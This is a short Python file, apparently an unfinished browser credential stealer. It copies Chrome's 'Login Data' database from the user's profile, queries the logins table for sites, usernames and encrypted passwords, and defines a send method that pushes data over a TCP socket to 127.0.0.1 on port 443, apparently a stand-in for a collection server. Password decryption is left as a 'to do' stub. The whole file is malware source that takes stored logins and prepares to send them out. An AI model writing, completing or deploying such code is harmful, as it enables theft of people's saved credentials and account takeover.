import socket
import sqlite3
import shutil
import os


class sender:

    def send(self, message):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect(('127.0.0.1', 443))
            client_socket.sendall(message)


    def get_chrome_info(self, file):
        with sqlite3.connect(file) as connection:
            cursor = connection.cursor()
            res = cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
            return res.fetchall()


    def copy_file(self):
        path = '{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(os.path.expanduser('~'))
        shutil.copy(path, '{}s'.format(path))


    def decrypt_pass(self, bPassword):
        print('to do')


